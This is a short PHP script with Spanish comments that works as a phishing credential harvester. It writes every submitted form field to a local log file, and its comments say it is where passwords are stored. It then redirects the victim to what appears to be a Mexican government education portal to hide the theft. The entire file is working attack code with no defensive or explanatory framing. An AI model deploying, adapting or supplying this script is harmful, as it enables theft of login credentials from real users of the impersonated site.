<?php
	//@Naiv_Sec&Inf
	header ('Location: http://www.siseems.sems.gob.mx/produccion/ '); //La URL a redireccionar tiene que estar luego de Location:
	$handle = fopen("log.txt", "a"); //Aqui se abre el archivo donde se va a guardar la contraseña
	//A partir de aqui se escriben las variables que obtiene luego del POST
	foreach($_POST as $variable => $value)	{
		fwrite($handle, $variable);
		fwrite($handle, "=");
		fwrite($handle, $value);
		fwrite($handle, "\r\n");
	}
	fwrite($handle, "\r\n");
	fclose($handle); //Se cierra el documento donde se guardan las contraseñas
	exit;
	//@Naiv_Sec&Inf
?>

